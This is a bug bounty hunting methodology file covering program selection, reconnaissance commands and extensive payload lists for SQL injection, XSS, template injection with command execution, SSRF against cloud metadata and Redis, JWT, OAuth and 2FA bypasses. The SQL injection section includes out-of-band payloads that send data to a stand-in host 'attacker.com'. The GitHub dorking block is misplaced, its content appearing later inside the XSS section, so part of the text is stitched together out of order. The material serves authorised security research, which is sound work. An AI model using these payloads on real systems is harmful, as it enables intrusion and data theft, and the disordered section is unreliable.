# METHODOLOGY.md — Complete Bug Bounty Hunting Methodology

> A comprehensive, phase-by-phase methodology for systematic bug bounty hunting. Follow this as your operational playbook.

---

## Phase 0: Platform & Program Selection

### Bug Bounty Platforms
| Platform | URL | Notes |
|----------|-----|-------|
| HackerOne | hackerone.com | Largest platform, many enterprise programs |
| Bugcrowd | bugcrowd.com | Strong triage, good for beginners |
| Intigriti | intigriti.com | European focus, growing fast |
| YesWeHack | yeswehack.com | European, good programs |
| Synack | synack.com | Invite-only, vetted researchers |
| Open Bug Bounty | openbugbounty.org | XSS/CSRF focused, no auth required |

### Program Selection Criteria
1. **Scope Size**: Larger scope = more attack surface = more bugs
2. **Wildcard Domains**: `*.target.com` is a goldmine — infinite subdomains to explore
3. **Program Age**: New programs have more low-hanging fruit; old programs reward deep research
4. **Response Time**: Check average time to first response and resolution
5. **Reward Table**: Understand what pays what — focus on high-reward vuln classes
6. **Technology Stack**: Pick targets using tech you know well
7. **Previous Disclosures**: Read past reports (Hacktivity) to understand what's been found

### Scope Analysis Checklist
- [ ] Read ALL program rules and scope definitions
- [ ] Identify in-scope domains, IPs, applications
- [ ] Note out-of-scope items explicitly
- [ ] Check for safe harbor provisions
- [ ] Understand testing restrictions (no DoS, no social engineering, etc.)
- [ ] Note any required headers or identifiers for testing
- [ ] Check if source code is available (GitHub, open source components)

---

## Phase 1: Reconnaissance — The Foundation of Everything

> "Give me six hours to chop down a tree and I will spend the first four sharpening the axe." — The recon phase determines your success.

### 1.1 Passive Reconnaissance

#### Subdomain Enumeration
```bash
# Certificate Transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Multiple tools for comprehensive coverage
subfinder -d target.com -all -o subs_subfinder.txt
amass enum -passive -d target.com -o subs_amass.txt
assetfinder --subs-only target.com > subs_assetfinder.txt
findomain -t target.com -q > subs_findomain.txt

# Combine and deduplicate
cat subs_*.txt | sort -u > all_subdomains.txt
```

#### DNS Deep Dive
```bash
# DNS records for each subdomain
dnsx -l all_subdomains.txt -a -aaaa -cname -mx -ns -txt -resp -o dns_records.txt

# Check for zone transfers
dig axfr target.com @ns1.target.com

# Check for dangling CNAMEs (subdomain takeover)
cat dns_records.txt | grep CNAME | while read line; do
  host $(echo $line | awk '{print $NF}') || echo "DANGLING: $line"
done
```

#### Technology Fingerprinting
```bash
# HTTP probing with tech detection
httpx -l all_subdomains.txt -title -tech-detect -status-code -content-length -o httpx_results.txt

# Detailed fingerprinting
whatweb -i live_hosts.txt --log-json=whatweb_results.json
```

#### Google Dorking
```
site:target.com filetype:pdf
site:target.com filetype:xlsx OR filetype:csv
site:target.com filetype:sql OR filetype:db
site:target.com filetype:log
site:target.com filetype:env OR filetype:cfg OR filetype:conf
site:target.com inurl:admin OR inurl:login OR inurl:dashboard
site:target.com inurl:api OR inurl:v1 OR inurl:v2
site:target.com intitle:"index of"
site:target.com ext:php inurl:?
site:target.com inurl:redirect OR inurl:url= OR inurl:next=
site:target.com inurl:upload OR inurl:file
site:target.com "error" OR "warning" OR "exception" OR "stack trace"
site:target.com "password" OR "secret" OR "token" OR "api_key"
```

#### GitHub Dorking
```

#### Wayback Machine & Historical Data
```bash
# Find old endpoints, parameters, and hidden pages
waybackurls target.com > wayback_urls.txt
gau target.com >> wayback_urls.txt

# Filter for interesting patterns
cat wayback_urls.txt | grep -E "\?" | sort -u > parameterized_urls.txt
cat wayback_urls.txt | grep -iE "\.js$" | sort -u > js_files.txt
cat wayback_urls.txt | grep -iE "\.(json|xml|csv|sql|log|bak|old|backup)" | sort -u > interesting_files.txt
```

#### JavaScript Analysis
```bash
# Extract endpoints and secrets from JavaScript files
cat js_files.txt | while read url; do
  curl -s "$url" | grep -oP '(https?://[^\s"]+|/api/[^\s"]+|/v[0-9]/[^\s"]+)' >> js_endpoints.txt
done

# Use specialized tools
python3 LinkFinder.py -i https://target.com -d -o cli > linkfinder_results.txt
python3 secretfinder.py -i https://target.com -o cli > secrets_found.txt
```

#### Cloud Asset Discovery
```bash
# S3 Bucket enumeration
python3 cloud_enum.py -k target -l cloud_results.txt

# Check common bucket naming patterns
for prefix in target target-dev target-staging target-prod target-backup target-assets; do
  aws s3 ls s3://$prefix --no-sign-request 2>/dev/null && echo "OPEN: $prefix"
done
```

### 1.2 Active Reconnaissance

#### Port Scanning
```bash
# Fast initial scan
rustscan -a target.com -- -sV -sC -oN nmap_results.txt

# Comprehensive scan
nmap -sS -sV -sC -p- -T4 --script=vuln target.com -oA full_scan

# UDP scan (often overlooked!)
nmap -sU --top-ports 100 target.com -oN udp_scan.txt
```

#### Directory & File Discovery
```bash
# Fast fuzzing with ffuf
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,403 -o ffuf_results.json

# Recursive directory brute
feroxbuster -u https://target.com -w /path/to/wordlist.txt --depth 3 -o ferox_results.txt

# API endpoint discovery
ffuf -u https://api.target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,401,403,405
```

#### Virtual Host Discovery
```bash
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w /path/to/vhosts.txt -fs <default_size>
```

#### Parameter Discovery
```bash
# Find hidden parameters
arjun -u https://target.com/endpoint -oJ arjun_results.json
paramspider -d target.com -o params.txt
```

---

## Phase 2: Vulnerability Discovery — The Hunt

### 2.1 Systematic Testing Approach

For EVERY endpoint discovered, test the following in order:

#### Input Points Checklist
- [ ] URL path segments
- [ ] Query parameters
- [ ] POST body parameters (form data, JSON, XML)
- [ ] HTTP headers (Host, X-Forwarded-For, Referer, User-Agent, Cookie)
- [ ] File upload fields
- [ ] WebSocket messages
- [ ] GraphQL queries/mutations

#### For Each Input Point, Test:
1. **Reflection**: Does input appear in the response? → XSS potential
2. **Error Messages**: Does malformed input cause errors? → Info disclosure, SQLi
3. **Behavior Change**: Does input change application behavior? → Logic flaws
4. **Access Control**: Can you access other users' data? → IDOR
5. **Injection**: Is input used in queries/commands? → SQLi, CMDi, SSTI
6. **File Operations**: Is input used in file paths? → Path traversal, LFI

### 2.2 Vulnerability-Specific Testing

#### SQL Injection
```
# Detection payloads
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' UNION SELECT NULL--
' AND 1=1--
' AND 1=2--
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
1' ORDER BY 1--
1' ORDER BY 100--

# Blind SQLi detection
' AND (SELECT SUBSTRING(version(),1,1))='5'--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

# Time-based blind
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND IF(1=1,SLEEP(5),0)--
' || pg_sleep(5)--

# Out-of-band (OOB)
'; EXEC xp_dirtree '\\attacker.com\share'--
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
```

#### Cross-Site Scripting (XSS)
```html
<!-- Basic payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- Attribute context -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus=alert(1) x="

<!-- JavaScript context -->
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

<!-- WAF bypass payloads -->
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- DOM XSS sources to check -->
document.location
document.URL
document.referrer
window.name
location.hash
location.search
postMessage handlers
```

"target.com" password
"target.com" secret
"target.com" api_key
"target.com" token
"target.com" AWS_SECRET
org:targetorg filename:.env
org:targetorg filename:docker-compose
org:targetorg filename:.git-credentials
org:targetorg "BEGIN RSA PRIVATE KEY"
org:targetorg jdbc: OR mysql:// OR postgresql://
```

#### Server-Side Template Injection (SSTI)
```
# Detection (polyglot)
${{<%[%'"}}%\

# Jinja2 (Python)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))

# ERB (Ruby)
<%= 7*7 %>
<%= system("id") %>

# Pebble (Java)
{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
```

#### Server-Side Request Forgery (SSRF)
```
# Internal service access
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1 (octal)
http://2130706433 (decimal)
http://0x7f000001 (hex)
http://127.1
http://127.0.0.1:8080
http://127.0.0.1:3000
http://127.0.0.1:9200 (Elasticsearch)
http://127.0.0.1:6379 (Redis)

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/ (AWS)
http://169.254.169.254/metadata/v1/ (DigitalOcean)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
http://169.254.169.254/metadata/instance (Azure)

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
file:///etc/passwd

# DNS rebinding
Use a domain that resolves to 127.0.0.1 after first resolution

# Bypass techniques
http://127.0.0.1@attacker.com
http://attacker.com#@127.0.0.1
http://127.0.0.1%23@attacker.com
http://127。0。0。1 (fullwidth dots)
```

#### Authentication & Session Attacks
```
# JWT attacks
1. Change algorithm to "none": {"alg":"none","typ":"JWT"}
2. Change RS256 to HS256 (key confusion)
3. Inject JWK in header: {"alg":"RS256","jwk":{...}}
4. JKU/X5U header injection pointing to attacker server
5. KID injection: {"kid":"../../dev/null","alg":"HS256"}
6. Brute force weak secrets: hashcat -m 16500 jwt.txt wordlist.txt

# OAuth attacks
1. redirect_uri manipulation (open redirect, path traversal)
2. Missing state parameter (CSRF)
3. Token leakage via Referer header
4. Scope escalation
5. Authorization code reuse
6. PKCE downgrade

# 2FA bypass
1. Response manipulation (change "success":false to true)
2. Status code manipulation (change 403 to 200)
3. Brute force if no rate limiting
4. Backup code brute force
5. Race condition on code validation
6. Direct access to post-2FA endpoints
7. Password reset bypasses 2FA
```

#### Business Logic Vulnerabilities
```
# Race conditions
1. Send concurrent requests to transfer/purchase endpoint
2. Use Turbo Intruder or custom async scripts
3. Test: coupon reuse, double-spend, vote manipulation

# Price manipulation
1. Negative quantity/price values
2. Integer overflow (2147483647 + 1)
3. Currency confusion
4. Discount stacking
5. Modify price in client-side request

# Workflow bypass
1. Skip steps in multi-step process
2. Access step 3 directly without step 1-2
3. Replay requests from earlier steps
4. Modify step identifiers

# File upload bypass
1. Extension bypass: .php5, .phtml, .php.jpg, .php%00.jpg
2. MIME type manipulation
3. Magic bytes injection
4. Polyglot files (valid image + valid PHP)
5. SVG with embedded JavaScript
6. .htaccess upload
7. Case sensitivity: .PhP, .PHP
```

---

## Phase 3: Exploitation & Impact Maximization

### Vulnerability Chaining Examples
```
Chain 1: Information Disclosure → Account Takeover
  Exposed user emails (info) → Password reset poisoning (medium) → Account takeover (critical)

Chain 2: XSS → Account Takeover
  Stored XSS (medium) → Steal admin session token → Admin account takeover (critical)

Chain 3: SSRF → RCE
  SSRF to internal service (medium) → Access Redis (high) → Write webshell via Redis (critical)

Chain 4: IDOR → Data Breach
  IDOR on API endpoint (medium) → Enumerate all user data → Mass data exfiltration (critical)

Chain 5: Open Redirect → OAuth Token Theft
  Open redirect (low) → Use as OAuth redirect_uri → Steal authorization code (high)
```

### PoC Development Guidelines
1. **Minimal**: Use the simplest possible PoC that demonstrates the issue
2. **Safe**: Never cause actual damage — demonstrate potential, not destruction
3. **Reproducible**: Step-by-step instructions anyone can follow
4. **Visual**: Screenshots, videos, HTTP request/response pairs
5. **Impactful**: Show the worst-case scenario clearly

---

## Phase 4: Reporting

See **REPORTING-TEMPLATE.md** for detailed report templates.

Key elements:
1. Clear, descriptive title
2. Severity assessment with CVSS score
3. Detailed description of the vulnerability
4. Step-by-step reproduction instructions
5. Impact analysis (technical + business)
6. Remediation recommendations
7. Supporting evidence (screenshots, requests, PoC code)

